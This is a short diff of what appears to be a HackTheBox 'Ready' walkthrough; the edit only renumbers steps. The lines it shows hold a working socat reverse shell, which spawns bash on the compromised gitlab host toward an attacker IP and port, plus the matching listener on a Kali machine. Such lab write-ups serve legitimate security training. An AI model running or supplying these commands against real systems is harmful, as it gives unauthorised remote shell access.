@@ -183,12 +183,12 @@ And make it executable
 git@gitlab:/tmp# chmod +x socat
 ```
 
-And run command
+2. Run command
 ```
 git@gitlab:/tmp# /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.162:5757
 ```
 
-Dont't forget about listener on kali:
+3. Dont't forget about listener on kali:
 ```
 ┌──(root💀kali)-[/home/kali/HTB/Ready]
 └─# socat file:`tty`,raw,echo=0 tcp-listen:5757                 
